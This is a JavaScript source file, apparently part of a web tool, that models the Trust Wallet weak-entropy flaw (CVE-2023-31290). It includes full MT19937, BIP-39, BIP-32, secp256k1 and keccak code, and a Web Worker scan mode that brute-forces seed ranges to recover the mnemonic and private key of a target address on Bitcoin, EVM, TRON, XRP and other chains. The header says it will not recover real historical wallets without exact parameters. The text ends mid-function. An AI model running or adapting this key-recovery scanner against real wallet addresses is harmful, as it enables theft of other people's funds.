/*
 * Trust Wallet Weak Entropy (CVE-2023-31290) — modeled MT19937 seed scanner,
 * with multi-chain address support.
 *
 * The Trust Wallet browser extension generated 12-word mnemonics with
 * Math.random() (a broken crypto fallback path). V8's Math.random is an
 * MT19937 generator whose state comes from a tiny 32-bit seed, so every
 * mnemonic it produced was brute-forceable from that seed — the "Trust Wallet
 * X" bug class.
 *
 * This tool MODELS that collapse. A single 32-bit seed drives a standard
 * MT19937 (the same algorithm as the era's Math.random); the first 4 outputs
 * (128 bits) become the BIP-39 entropy, which yields the real 12-word
 * mnemonic, PBKDF2-HMAC-SHA512(2048) BIP-39 seed, and the BIP-32 master key.
 * The first receiving address (m/44'/coin'/0'/0/0) is derived per chain.
 *
 * HONEST SCOPE: this models the *collapse of the wallet RNG to a 32-bit seed*.
 * It is NOT a byte-exact reproduction of the specific Trust Wallet build, so
 * it will not recover real historical wallets without the exact wallet-creation
 * parameters (the wallet's exact RNG path and creation time). It recovers any
 * wallet generated under this model and demonstrates why 32-bit RNG seeding is
 * catastrophic. All BIP-39 / BIP-32 / secp256k1 math is real; every hit is
 * verified by regenerating the address.
 *
 * Chain support: the mnemonic derives keys for every secp256k1-based chain
 * (Bitcoin-family P2PKH, EVM + TRON via keccak-256, XRP via hash160 + XRP
 * base58). Solana / TON / Sui use Ed25519, not secp256k1, so they cannot be
 * derived — the UI says so instead of guessing.
 *
 * Two modes (wordlist is fetched once from ../assets/data/bip39-english.txt):
 *   • Verify a seed — full derivation for the selected chain (instant).
 *   • Scan a target — brute a seed range for the target address on the
 *                     selected chain (bounded Web Worker; PBKDF2 per seed is
 *                     the cost, so keep ranges modest).
 * Depends on CryptoJS (loaded before this file). Exposes window.processTxid
 * (scan), window.verifyPid, window.exportOne.
 */
(function () {
    "use strict";

    // ---- Constants -------------------------------------------------------
    const BTC_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    const XRP_ALPHABET = "rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz";
    const N = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');
    const P_CURVE = (2n ** 256n) - (2n ** 32n) - 977n;
    const Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798n;
    const Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8n;
    const HARDENED = 0x80000000;
    const MAX_RANGE = 100000;        // guard: cap a single scan's span (100k seeds)

    // ---- Chain registry --------------------------------------------------
    // kind: 'p2pkh' | 'zcash' | 'evm' | 'tron' | 'xrp' | 'ed25519'
    // coin: BIP-44 coin type for the m/44'/coin'/0'/0/0 derivation path.
    var CHAINS = {
        bitcoin:        { name: 'Bitcoin',      kind: 'p2pkh',   version: '00', coin: 0 },
        ethereum:       { name: 'Ethereum',     kind: 'evm',                    coin: 60 },
        bnb:            { name: 'BNB Chain',    kind: 'evm',                    coin: 60 },
        arbitrum:       { name: 'Arbitrum',     kind: 'evm',                    coin: 60 },
        optimism:       { name: 'Optimism',     kind: 'evm',                    coin: 60 },
        base:           { name: 'Base',         kind: 'evm',                    coin: 60 },
        polygon:        { name: 'Polygon',      kind: 'evm',                    coin: 60 },
        avalanche:      { name: 'Avalanche',    kind: 'evm',                    coin: 60 },
        zksync:         { name: 'zkSync Era',   kind: 'evm',                    coin: 60 },
        solana:         { name: 'Solana',       kind: 'ed25519' },
        tron:           { name: 'Tron',         kind: 'tron',                   coin: 195 },
        toncoin:        { name: 'TON',          kind: 'ed25519' },
        sui:            { name: 'Sui',          kind: 'ed25519' },
        xrp:            { name: 'XRP',          kind: 'xrp',                    coin: 144 },
        litecoin:       { name: 'Litecoin',     kind: 'p2pkh',   version: '30', coin: 2 },
        'bitcoin-cash': { name: 'Bitcoin Cash', kind: 'p2pkh',   version: '00', coin: 145 },
        dogecoin:       { name: 'Dogecoin',     kind: 'p2pkh',   version: '1e', coin: 3 },
        zcash:          { name: 'Zcash',        kind: 'zcash',   version: '1cb8', coin: 133 }
    };
    function chainInfo(c) { return CHAINS[c] || CHAINS.bitcoin; }

    // ---- Low-level converters -------------------------------------------
    function hexToBytes(hex) {
        if (!hex || typeof hex !== 'string') return new Uint8Array();
        if (hex.length % 2 !== 0) hex = '0' + hex;
        const m = hex.match(/.{1,2}/g);
        return m ? new Uint8Array(m.map(b => parseInt(b, 16))) : new Uint8Array();
    }
    function bytesToHex(bytes) {
        return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
    }
    function hx64(b) { let s = b.toString(16); while (s.length < 64) s = "0" + s; return s; }
    function strToHex(s) {
        return Array.from(new TextEncoder().encode(s)).map(b => b.toString(16).padStart(2, '0')).join('');
    }

    // ---- Hashing (CryptoJS) ---------------------------------------------
    function sha256hex(hex) { return CryptoJS.SHA256(CryptoJS.enc.Hex.parse(hex)).toString(); }
    function ripe160hex(hex) { return CryptoJS.RIPEMD160(CryptoJS.enc.Hex.parse(hex)).toString(); }
    function dblsha256(hex) { return sha256hex(sha256hex(hex)); }
    function hash160Hex(pubHex) { return ripe160hex(sha256hex(pubHex)); }

    // ---- keccak-256 (Ethereum / TRON) -----------------------------------
    var KECCAK_RC = [0x0000000000000001n, 0x0000000000008082n, 0x800000000000808an, 0x8000000080008000n, 0x000000000000808bn, 0x0000000080000001n, 0x8000000080008081n, 0x8000000000008009n, 0x000000000000008an, 0x0000000000000088n, 0x0000000080008009n, 0x000000008000000an, 0x000000008000808bn, 0x800000000000008bn, 0x8000000000008089n, 0x8000000000008003n, 0x8000000000008002n, 0x8000000000000080n, 0x000000000000800an, 0x800000008000000an, 0x8000000080008081n, 0x8000000000008080n, 0x0000000080000001n, 0x8000000080008008n];
    var KECCAK_RHO = [1, 3, 6, 10, 15, 21, 28, 36, 45, 55, 2, 14, 27, 41, 56, 8, 25, 43, 62, 18, 39, 61, 20, 44];
    var KECCAK_PILN = [10, 7, 11, 17, 18, 3, 5, 16, 8, 21, 24, 4, 15, 23, 19, 13, 12, 2, 20, 14, 22, 9, 6, 1];
    var M64 = (1n << 64n) - 1n;
    function kRol(x, s) { s = s % 64n; return s === 0n ? x : ((x << s) | (x >> (64n - s))) & M64; }
    function keccakF(a) {
        var B = new Array(25).fill(0n), C = [0n, 0n, 0n, 0n, 0n], x, y, i, t, j, v, D;
        for (var round = 0; round < 24; round++) {
            for (x = 0; x < 5; x++) C[x] = a[x] ^ a[x + 5] ^ a[x + 10] ^ a[x + 15] ^ a[x + 20];
            for (x = 0; x < 5; x++) {
                D = C[(x + 4) % 5] ^ kRol(C[(x + 1) % 5], 1n);
                for (y = 0; y < 5; y++) a[x + 5 * y] ^= D;
            }
            t = a[1];
            for (x = 0; x < 24; x++) {
                j = KECCAK_PILN[x]; v = a[j];
                a[j] = kRol(t, BigInt(KECCAK_RHO[x]));
                t = v;
            }
            for (y = 0; y < 5; y++) {
                for (x = 0; x < 5; x++) B[x + 5 * y] = a[x + 5 * y] ^ ((~a[(x + 1) % 5 + 5 * y]) & a[(x + 2) % 5 + 5 * y]);
            }
            for (i = 0; i < 25; i++) a[i] = B[i];
            a[0] ^= KECCAK_RC[round];
        }
    }
    function keccak256Hex(bytes) {
        var rate = 136, st = new BigUint64Array(25), buf = new Uint8Array(bytes);
        var full = Math.floor(buf.length / rate), b, i, off, k, lane;
        for (b = 0; b < full; b++) {
            for (i = 0; i < rate / 8; i++) {
                off = b * rate + i * 8; lane = 0n;
                for (k = 7; k >= 0; k--) lane = (lane << 8n) | BigInt(buf[off + k]);
                st[i] ^= lane;
            }
            keccakF(st);
        }
        var rem = buf.length - full * rate, last = new Uint8Array(rate);
        last.set(buf.subarray(full * rate));
        last[rem] ^= 0x01; last[rate - 1] ^= 0x80;
        for (i = 0; i < rate / 8; i++) {
            off = i * 8; lane = 0n;
            for (k = 7; k >= 0; k--) lane = (lane << 8n) | BigInt(last[off + k]);
            st[i] ^= lane;
        }
        keccakF(st);
        var out = new Uint8Array(32);
        for (i = 0; i < 4; i++) {
            lane = st[i];
            for (k = 0; k < 8; k++) { out[i * 8 + k] = Number(lane & 0xffn); lane >>= 8n; }
        }
        return bytesToHex(out);
    }

    // ---- Base58 / addresses ---------------------------------------------
    function b58encode(hex, alphabet) {
        var A = alphabet || BTC_ALPHABET;
        let num = BigInt("0x" + hex), str = "";
        while (num > 0n) { str = A[Number(num % 58n)] + str; num /= 58n; }
        for (let i = 0; i < hex.length; i += 2) { if (hex.substring(i, i + 2) === "00") str = A[0] + str; else break; }
        return str;
    }
    function b58decodeToHex(s, alphabet) {
        var A = alphabet || BTC_ALPHABET;
        let num = 0n;
        for (const ch of s) {
            const i = A.indexOf(ch);
            if (i < 0) throw new Error("Invalid address character '" + ch + "'");
            num = num * 58n + BigInt(i);
        }
        let hex = num.toString(16);
        if (hex.length % 2) hex = "0" + hex;
        let zeros = 0;
        for (const ch of s) { if (ch === A[0]) zeros++; else break; }
        return "00".repeat(zeros) + hex;
    }
    function b58checkDecode(s, alphabet) {
        const hex = b58decodeToHex(s.trim(), alphabet);
        if (hex.length < 10) throw new Error("Address too short");
        const payload = hex.slice(0, -8), checksum = hex.slice(-8);
        return { payload: payload, checksumOk: dblsha256(payload).slice(0, 8) === checksum };
    }
    function base58checkAddr(payloadHex) { return b58encode(payloadHex + dblsha256(payloadHex).slice(0, 8)); }
    function base58checkAddrXrp(payloadHex) { return b58encode(payloadHex + dblsha256(payloadHex).slice(0, 8), XRP_ALPHABET); }
    function addrFromPub(pubHex, version) { return base58checkAddr(version + hash160Hex(pubHex)); }
    function privToWif(privHex, compressed) {
        const payload = "80" + privHex + (compressed ? "01" : "");
        return b58encode(payload + dblsha256(payload).slice(0, 8));
    }

    // ---- secp256k1 (Jacobian scalar-mul) --------------------------------
    function mod(a, m) { const r = a % m; return r < 0n ? r + m : r; }
    function egcd(a, b) { if (b === 0n) return [a, 1n, 0n]; const r = egcd(b, a % b); return [r[0], r[2], r[1] - (a / b) * r[2]]; }
    function modInv(a, m) { a = mod(a, m); const r = egcd(a, m); return mod(r[1], m); }
    function jDouble(Pp) {
        const Y = Pp.Y; if (Y === 0n) return { X: 0n, Y: 0n, Z: 0n };
        const X = Pp.X, Z = Pp.Z;
        const A = mod(X * X, P_CURVE), B = mod(Y * Y, P_CURVE), C = mod(B * B, P_CURVE);
        const D = mod(2n * (mod((X + B) * (X + B), P_CURVE) - A - C), P_CURVE);
        const E = mod(3n * A, P_CURVE), F = mod(E * E, P_CURVE);
        const X3 = mod(F - 2n * D, P_CURVE);
        return { X: X3, Y: mod(E * (D - X3) - 8n * C, P_CURVE), Z: mod(2n * Y * Z, P_CURVE) };
    }
    function jAdd(Pp, Qp) {
        if (Pp.Z === 0n) return Qp; if (Qp.Z === 0n) return Pp;
        const Z1Z1 = mod(Pp.Z * Pp.Z, P_CURVE), Z2Z2 = mod(Qp.Z * Qp.Z, P_CURVE);
        const U1 = mod(Pp.X * Z2Z2, P_CURVE), U2 = mod(Qp.X * Z1Z1, P_CURVE);
        const S1 = mod(mod(Pp.Y * Qp.Z, P_CURVE) * Z2Z2, P_CURVE), S2 = mod(mod(Qp.Y * Pp.Z, P_CURVE) * Z1Z1, P_CURVE);
        if (U1 === U2) { if (S1 !== S2) return { X: 0n, Y: 0n, Z: 0n }; return jDouble(Pp); }
        const H = mod(U2 - U1, P_CURVE), I = mod((2n * H) * (2n * H), P_CURVE), J = mod(H * I, P_CURVE);
        const r = mod(2n * (S2 - S1), P_CURVE), V = mod(U1 * I, P_CURVE);
        const X3 = mod(r * r - J - 2n * V, P_CURVE);
        return {
            X: X3,
            Y: mod(r * (V - X3) - 2n * S1 * J, P_CURVE),
            Z: mod((mod((Pp.Z + Qp.Z) * (Pp.Z + Qp.Z), P_CURVE) - Z1Z1 - Z2Z2) * H, P_CURVE)
        };
    }
    function sMul(k) {
        k = mod(k, N); let R = { X: 0n, Y: 0n, Z: 0n }, A = { X: Gx, Y: Gy, Z: 1n };
        while (k > 0n) { if (k & 1n) R = jAdd(R, A); A = jDouble(A); k >>= 1n; }
        if (R.Z === 0n) return null;
        const zi = modInv(R.Z, P_CURVE), zi2 = mod(zi * zi, P_CURVE), zi3 = mod(zi2 * zi, P_CURVE);
        return { x: mod(R.X * zi2, P_CURVE), y: mod(R.Y * zi3, P_CURVE) };
    }
    function pubsFromPriv(d) {
        const Q = sMul(d);
        const x = hx64(Q.x), y = hx64(Q.y);
        return { x: x, y: y, cpub: (Q.y & 1n ? "03" : "02") + x, upub: "04" + x + y };
    }
    function compressPub(pub) {
        pub = pub.toLowerCase();
        if (pub.length === 66 && (pub.slice(0, 2) === "02" || pub.slice(0, 2) === "03")) return pub;
        if (pub.length === 130 && pub.slice(0, 2) === "04") {
            var y = BigInt("0x" + pub.slice(66));
            return (y & 1n ? "03" : "02") + pub.slice(2, 66);
        }
        return null;
    }

    // ---- MT19937 (the algorithm behind V8 Math.random of the era) --------
    // Standard MT19937 with init_genrand(seed). 32-bit seed -> infinite
    // 32-bit outputs. The 128-bit BIP-39 entropy = the first 4 outputs.
    function mt19937(seed) {
        var mt = new Uint32Array(624);
        mt[0] = seed >>> 0;
        for (var i = 1; i < 624; i++) {
            mt[i] = (Math.imul(1812433253, (mt[i - 1] ^ (mt[i - 1] >>> 30))) + i) >>> 0;
        }
        var index = 624;
        function twist() {
            for (var i = 0; i < 624; i++) {
                var y = ((mt[i] & 0x80000000) | (mt[(i + 1) % 624] & 0x7fffffff)) >>> 0;
                mt[i] = (mt[(i + 397) % 624] ^ (y >>> 1) ^ (y & 1 ? 0x9908b0df : 0)) >>> 0;
            }
            index = 0;
        }
        function next() {
            if (index >= 624) twist();
            var y = mt[index++];
            y ^= y >>> 11;
            y ^= (y << 7) & 0x9d2c5680;
            y ^= (y << 15) & 0xefc60000;
            y ^= y >>> 18;
            return y >>> 0;
        }
        return { next: next };
    }
    // seed -> 128-bit BIP-39 entropy hex (32 hex chars), big-endian words.
    function mtEntropyHex(seed) {
        var rng = mt19937(seed >>> 0);
        var hex = "";
        for (var i = 0; i < 4; i++) hex += rng.next().toString(16).padStart(8, '0');
        return hex;
    }

    // ---- BIP-39 mnemonic (wordlist supplied) ----------------------------
    // entropy hex -> 12-word mnemonic (128..256 bit entropy supported).
    function entropyToMnemonic(hex, words) {
        if (!words || !hex) return null;
        const bits = hex.length * 4;
        if ([128, 160, 192, 224, 256].indexOf(bits) === -1) return null;
        const csBits = bits / 32;
        const hash = sha256hex(hex);
        let b = '';
        for (let i = 0; i < hex.length; i++) b += parseInt(hex[i], 16).toString(2).padStart(4, '0');
        let cb = '';
        for (let j = 0; j < hash.length && cb.length < csBits; j++) cb += parseInt(hash[j], 16).toString(2).padStart(4, '0');
        b += cb.slice(0, csBits);
        const out = [];
        for (let p = 0; p < b.length; p += 11) out.push(words[parseInt(b.slice(p, p + 11), 2)]);
        return out.join(' ');
    }

    // ---- BIP-32 / BIP-44 -------------------------------------------------
    function pbkdf2Sha512Hex(pass, salt) {
        return CryptoJS.PBKDF2(pass, salt, {
            keySize: 512 / 32,
            iterations: 2048,
            hasher: CryptoJS.algo.SHA512
        }).toString(CryptoJS.enc.Hex);
    }
    // BIP-39 seed -> BIP-32 master node {priv, chain}
    function masterFromSeed(seedHex) {
        var I = CryptoJS.HmacSHA512(CryptoJS.enc.Hex.parse(seedHex), CryptoJS.enc.Utf8.parse("Bitcoin seed")).toString();
        return { priv: I.slice(0, 64), chain: I.slice(64) };
    }
    // BIP-32 CKDpriv. index < 2^31 = non-hardened; hardened adds 2^31.
    function ckdPriv(kParHex, chainHex, index, hardened) {
        var i = (index >>> 0) + (hardened ? HARDENED : 0);
        var ser32 = (i >>> 0).toString(16).padStart(8, '0');
        var data;
        if (hardened) {
            data = '00' + kParHex + ser32;
        } else {
            var pk = pubsFromPriv(BigInt('0x' + kParHex));
            data = compressPub(pk.cpub) + ser32;
        }
        var I = CryptoJS.HmacSHA512(CryptoJS.enc.Hex.parse(data), CryptoJS.enc.Hex.parse(chainHex)).toString();
        var IL = I.slice(0, 64), IR = I.slice(64);
        var child = (BigInt('0x' + IL) + BigInt('0x' + kParHex)) % N;
        if (child === 0n) throw new Error("Invalid child key");
        return { priv: hx64(child), chain: IR };
    }
    // First receiving key at m/44'/coin'/0'/0/0 from a BIP-39 seed hex.
    function derivePathPriv(seedHex, coin) {
        var node = masterFromSeed(seedHex);
        node = ckdPriv(node.priv, node.chain, 44, true);
        node = ckdPriv(node.priv, node.chain, coin, true);
        node = ckdPriv(node.priv, node.chain, 0, true);
        node = ckdPriv(node.priv, node.chain, 0, false);
        node = ckdPriv(node.priv, node.chain, 0, false);
        return node.priv;
    }

    // ---- Multi-chain address derivation ----------------------------------
    function chainAddresses(pk, c) {
        var info = chainInfo(c);
        if (info.kind === 'p2pkh' || info.kind === 'zcash') {
            return [addrFromPub(pk.cpub, info.version), addrFromPub(pk.upub, info.version)];
        }
        if (info.kind === 'evm' || info.kind === 'tron') {
            var k = keccak256Hex(hexToBytes(pk.upub.slice(2))).slice(-40);
            if (info.kind === 'tron') return [base58checkAddr("41" + k)];
            return ["0x" + k.toLowerCase()];
        }
        if (info.kind === 'xrp') return [base58checkAddrXrp("00" + hash160Hex(pk.cpub))];
        return [];
    }
    function chainCompareValue(pk, c) {
        var info = chainInfo(c);
        if (info.kind === 'evm') return "0x" + keccak256Hex(hexToBytes(pk.upub.slice(2))).slice(-40);
        if (info.kind === 'tron') return keccak256Hex(hexToBytes(pk.upub.slice(2))).slice(-40);
        if (info.kind === 'xrp') return hash160Hex(pk.cpub);
        return hash160Hex(pk.cpub);
    }
    function parseTarget(c, raw) {
        var info = chainInfo(c);
        if (info.kind === 'ed25519') {
            throw new Error(info.name + " uses the Ed25519 curve — a BIP-39/BIP-32 secp256k1 key cannot derive a " + info.name + " address. Switch to a secp256k1 chain (Bitcoin, EVM, TRON, XRP, Litecoin…).");
        }
        if (info.kind === 'evm') {
            var s = String(raw || "").trim();
            var evm = /^(0x)?[0-9a-fA-F]{40}$/.exec(s);
            if (!evm) throw new Error("Enter a valid " + info.name + " address (0x + 40 hex characters).");
            var hex = evm[1] ? s.slice(2) : s;
            return { ok: true, target: "0x" + hex.toLowerCase(), kind: 'evm', addr: "0x" + hex.toLowerCase() };
        }
        var alphabet = info.kind === 'xrp' ? XRP_ALPHABET : BTC_ALPHABET;
        var dec;
        try { dec = b58checkDecode(raw, alphabet); }
        catch (e) { throw new Error(e.message); }
        if (!dec.checksumOk) throw new Error("Bad checksum — not a valid address");
        var version = info.kind === 'zcash' ? dec.payload.slice(0, 4) : dec.payload.slice(0, 2);
        var expectedV = info.kind === 'zcash' ? "1cb8" : info.kind === 'tron' ? "41" : info.kind === 'xrp' ? "00" : info.version;
        if (version.toLowerCase() !== expectedV.toLowerCase()) {
            throw new Error("That address is not a " + info.name + " address (version byte 0x" + version + ").");
        }
        var hash = info.kind === 'zcash' ? dec.payload.slice(4) : dec.payload.slice(2);
        return { ok: true, target: hash.toLowerCase(), kind: info.kind, addr: String(raw || "").trim() };
    }

    // ---- Wordlist --------------------------------------------------------
    var _wordlist = null;
    async function loadWordlist() {
        if (_wordlist) return _wordlist;
        try {
            const r = await fetch('../assets/data/bip39-english.txt', { signal: AbortSignal.timeout(8000) });
            if (!r.ok) return null;
            const t = await r.text();
            const arr = t.split(/\r?\n/).map(function (s) { return s.trim(); }).filter(Boolean);
            if (arr.length >= 2048) { _wordlist = arr.slice(0, 2048); return _wordlist; }
        } catch (e) { /* offline / blocked */ }
        return null;
    }

    // ---- Bounded brute (Web Worker) --------------------------------------
    // Message in : {target, kind, coin, lo, hi, words}.
    // Words = 2048-word BIP-39 list (fetched on the main thread) — a blob
    // worker has no relative base for its own fetch.
    function twWorkerBody() {
        "use strict";
        try { importScripts("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"); }
        catch (e) { postMessage({ type: "noimport" }); return; }

        var N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141n;
        var P = (2n ** 256n) - (2n ** 32n) - 977n;
        var Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798n;
        var Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8n;

        function mod(a, m) { var r = a % m; return r < 0n ? r + m : r; }
        function egcd(a, b) { if (b === 0n) return [a, 1n, 0n]; var r = egcd(b, a % b); return [r[0], r[2], r[1] - (a / b) * r[2]]; }
        function modInv(a, m) { a = mod(a, m); var r = egcd(a, m); return mod(r[1], m); }
        function jD(Pp) {
            var Y = Pp.Y; if (Y === 0n) return { X: 0n, Y: 0n, Z: 0n };
            var X = Pp.X, Z = Pp.Z, A = mod(X * X, P), B = mod(Y * Y, P), C = mod(B * B, P);
            var D = mod(2n * (mod((X + B) * (X + B), P) - A - C), P), E = mod(3n * A, P), F = mod(E * E, P);
            var X3 = mod(F - 2n * D, P);
            return { X: X3, Y: mod(E * (D - X3) - 8n * C, P), Z: mod(2n * Y * Z, P) };
        }
        function jA(Pp, Qp) {
            if (Pp.Z === 0n) return Qp; if (Qp.Z === 0n) return Pp;
            var Z1 = mod(Pp.Z * Pp.Z, P), Z2 = mod(Qp.Z * Qp.Z, P);
            var U1 = mod(Pp.X * Z2, P), U2 = mod(Qp.X * Z1, P);
            var S1 = mod(mod(Pp.Y * Qp.Z, P) * Z2, P), S2 = mod(mod(Qp.Y * Pp.Z, P) * Z1, P);
            if (U1 === U2) { if (S1 !== S2) return { X: 0n, Y: 0n, Z: 0n }; return jD(Pp); }
            var H = mod(U2 - U1, P), I = mod((2n * H) * (2n * H), P), J = mod(H * I, P);
            var r = mod(2n * (S2 - S1), P), V = mod(U1 * I, P), X3 = mod(r * r - J - 2n * V, P);
            return { X: X3, Y: mod(r * (V - X3) - 2n * S1 * J, P), Z: mod((mod((Pp.Z + Qp.Z) * (Pp.Z + Qp.Z), P) - Z1 - Z2) * H, P) };
        }
        function sMul(k) {
            k = mod(k, N); var R = { X: 0n, Y: 0n, Z: 0n }, A = { X: Gx, Y: Gy, Z: 1n };
            while (k > 0n) { if (k & 1n) R = jA(R, A); A = jD(A); k >>= 1n; }
            if (R.Z === 0n) return null;
            var zi = modInv(R.Z, P), zi2 = mod(zi * zi, P), zi3 = mod(zi2 * zi, P);
            return { x: mod(R.X * zi2, P), y: mod(R.Y * zi3, P) };
        }
        function hx(b) { var s = b.toString(16); while (s.length < 64) s = "0" + s; return s; }
        function h160(pub) { return CryptoJS.RIPEMD160(CryptoJS.SHA256(CryptoJS.enc.Hex.parse(pub))).toString(); }
        function cpubFromPriv(d) {
            var Q = sMul(d), xh = hx(Q.x);
            return (Q.y & 1n ? "03" : "02") + xh;
        }
        // --- keccak-256 (in-worker) ---
        var RC = [0x0000000000000001n, 0x0000000000008082n, 0x800000000000808an, 0x8000000080008000n, 0x000000000000808bn, 0x0000000080000001n, 0x8000000080008081n, 0x8000000000008009n, 0x000000000000008an, 0x0000000000000088n, 0x0000000080008009n, 0x000000008000000an, 0x000000008000808bn, 0x800000000000008bn, 0x8000000000008089n, 0x8000000000008003n, 0x8000000000008002n, 0x8000000000000080n, 0x000000000000800an, 0x800000008000000an, 0x8000000080008081n, 0x8000000000008080n, 0x0000000080000001n, 0x8000000080008008n];
        var RHO = [1, 3, 6, 10, 15, 21, 28, 36, 45, 55, 2, 14, 27, 41, 56, 8, 25, 43, 62, 18, 39, 61, 20, 44];
        var PILN = [10, 7, 11, 17, 18, 3, 5, 16, 8, 21, 24, 4, 15, 23, 19, 13, 12, 2, 20, 14, 22, 9, 6, 1];
        var M64 = (1n << 64n) - 1n;
        function rol(x, s) { s = s % 64n; return s === 0n ? x : ((x << s) | (x >> (64n - s))) & M64; }
        function kF(a) {
            var B = new Array(25).fill(0n), C = [0n, 0n, 0n, 0n, 0n], x, y, i, t, j, v, D;
            for (var round = 0; round < 24; round++) {
                for (x = 0; x < 5; x++) C[x] = a[x] ^ a[x + 5] ^ a[x + 10] ^ a[x + 15] ^ a[x + 20];
                for (x = 0; x < 5; x++) {
                    D = C[(x + 4) % 5] ^ rol(C[(x + 1) % 5], 1n);
                    for (y = 0; y < 5; y++) a[x + 5 * y] ^= D;
                }
                t = a[1];
                for (x = 0; x < 24; x++) {
                    j = PILN[x]; v = a[j];
                    a[j] = rol(t, BigInt(RHO[x]));
                    t = v;
                }
                for (y = 0; y < 5; y++) {
                    for (x = 0; x < 5; x++) B[x + 5 * y] = a[x + 5 * y] ^ ((~a[(x + 1) % 5 + 5 * y]) & a[(x + 2) % 5 + 5 * y]);
                }
                for (i = 0; i < 25; i++) a[i] = B[i];
                a[0] ^= RC[round];
            }
        }
        function keccakHex(bytes) {
            var rate = 136, st = new BigUint64Array(25), buf = new Uint8Array(bytes);
            var full = Math.floor(buf.length / rate), b, i, off, k, lane;
            for (b = 0; b < full; b++) {
                for (i = 0; i < rate / 8; i++) {
                    off = b * rate + i * 8; lane = 0n;
                    for (k = 7; k >= 0; k--) lane = (lane << 8n) | BigInt(buf[off + k]);
                    st[i] ^= lane;
                }
                kF(st);
            }
            var rem = buf.length - full * rate, last = new Uint8Array(rate);
            last.set(buf.subarray(full * rate));
            last[rem] ^= 0x01; last[rate - 1] ^= 0x80;
            for (i = 0; i < rate / 8; i++) {
                off = i * 8; lane = 0n;
                for (k = 7; k >= 0; k--) lane = (lane << 8n) | BigInt(last[off + k]);
                st[i] ^= lane;
            }
            kF(st);
            var out = new Uint8Array(32), o = 0, hex = "";
            for (i = 0; i < 4; i++) {
                lane = st[i];
                for (k = 0; k < 8; k++) { out[o++] = Number(lane & 0xffn); lane >>= 8n; }
            }
            for (i = 0; i < out.length; i++) hex += out[i].toString(16).padStart(2, "0");
            return hex;
        }
        function bytesOfHex(h) {
            var out = new Uint8Array(h.length / 2);
            for (var i = 0; i < out.length; i++) out[i] = parseInt(h.substring(i * 2, i * 2 + 2), 16);
            return out;
        }
        function mtEntropy(seed) {
            var mt = new Uint32Array(624), i;
            mt[0] = seed >>> 0;
            for (i = 1; i < 624; i++) mt[i] = (Math.imul(1812433253, (mt[i - 1] ^ (mt[i - 1] >>> 30))) + i) >>> 0;
            var idx = 624;
            function twist() {
                for (i = 0; i < 624; i++) {
                    var y = ((mt[i] & 0x80000000) | (mt[(i + 1) % 624] & 0x7fffffff)) >>> 0;
                    mt[i] = (mt[(i + 397) % 624] ^ (y >>> 1) ^ (y & 1 ? 0x9908b0df : 0)) >>> 0;
                }
                idx = 0;
            }
            function next() {
                if (idx >= 624) twist();
                var y = mt[idx++];
                y ^= y >>> 11;
                y ^= (y << 7) & 0x9d2c5680;
                y ^= (y << 15) & 0xefc60000;
                y ^= y >>> 18;
                return y >>> 0;
            }
            var hex = "";
            for (i = 0; i < 4; i++) hex += next().toString(16).padStart(8, "0");
            return hex;
        }
        function mnemonicFromEntropy(hex, words) {
            var csBits = 4, b = "", cb = "", out = [], p, i;
            var hash = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(hex)).toString();
            for (i = 0; i < hex.length; i++) b += parseInt(hex[i], 16).toString(2).padStart(4, "0");
            for (i = 0; i < hash.length && cb.length < csBits; i++) cb += parseInt(hash[i], 16).toString(2).padStart(4, "0");
            b += cb.slice(0, csBits);
            for (p = 0; p < b.length; p += 11) out.push(words[parseInt(b.slice(p, p + 11), 2)]);
            return out.join(" ");
        }
        // PBKDF2-HMAC-SHA512(2048) — native WebCrypto where available (localhost /
        // https are secure contexts), CryptoJS fallback otherwise. Returns a Promise
        // of the 64-byte BIP-39 seed hex.
        function pbkdf2(mnemonic) {
            return new Promise(function (resolve) {
                var textEnc = new TextEncoder();
                try {
                    if (typeof crypto !== 'undefined' && crypto.subtle && crypto.subtle.deriveBits) {
                        crypto.subtle.importKey('raw', textEnc.encode(mnemonic), 'PBKDF2', false, ['deriveBits']).then(function (key) {
                            return crypto.subtle.deriveBits({ name: 'PBKDF2', hash: 'SHA-512', salt: textEnc.encode('mnemonic'), iterations: 2048 }, key, 512);
                        }).then(function (bits) {
                            var arr = new Uint8Array(bits), hex = "";
                            for (var i = 0; i < arr.length; i++) hex += arr[i].toString(16).padStart(2, "0");
                            resolve(hex);
                        }).catch(function () { resolve(CryptoJS.PBKDF2(mnemonic, "mnemonic", { keySize: 16, iterations: 2048, hasher: CryptoJS.algo.SHA512 }).toString(CryptoJS.enc.Hex)); });
                        return;
                    }
                } catch (e) { /* fall through */ }
                resolve(CryptoJS.PBKDF2(mnemonic, "mnemonic", { keySize: 16, iterations: 2048, hasher: CryptoJS.algo.SHA512 }).toString(CryptoJS.enc.Hex));
            });
        }
        function pathPriv(seedHex, coin) {
            function hm(dataHex, keyHex) { return CryptoJS.HmacSHA512(CryptoJS.enc.Hex.parse(dataHex), CryptoJS.enc.Hex.parse(keyHex)).toString(); }
            var I = CryptoJS.HmacSHA512(CryptoJS.enc.Hex.parse(seedHex), CryptoJS.enc.Utf8.parse("Bitcoin seed")).toString();
            var priv = I.slice(0, 64), chain = I.slice(64);
            var steps = [[44, 1], [coin, 1], [0, 1], [0, 0], [0, 0]], s, i, ser32, data, Il;
            for (s = 0; s < steps.length; s++) {
                var idx = (steps[s][0] >>> 0) + (steps[s][1] ? 0x80000000 : 0);
                ser32 = (idx >>> 0).toString(16).padStart(8, "0");
                if (steps[s][1]) data = "00" + priv + ser32;
                else data = cpubFromPriv(BigInt("0x" + priv)) + ser32;
                Il = hm(data, chain);
